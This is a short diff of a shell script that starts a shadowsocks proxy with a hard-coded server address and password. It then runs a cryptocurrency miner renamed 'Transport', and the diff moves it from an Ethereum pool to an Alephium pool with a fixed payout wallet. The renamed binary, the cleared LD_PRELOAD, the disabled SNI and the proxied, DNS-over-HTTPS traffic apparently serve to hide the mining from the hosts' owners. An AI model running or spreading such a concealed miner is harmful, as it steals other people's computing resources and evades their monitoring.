@@ -39,4 +39,4 @@ ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305
 
 ph add Transport
 
-LD_PRELOAD="" ./Transport -a ethash -o stratum+tcp://us1.ethermine.org:4444 -u 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p x -w $(echo $(shuf -i 1-9999 -n 1)-WEWEK) --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+LD_PRELOAD="" ./Transport -a blake3 -o stratum+ssl://us2.alephium.herominers.com:1199 -u 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup -p x -w $(echo $(shuf -i 1-9999 -n 1)-WEWEK) --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
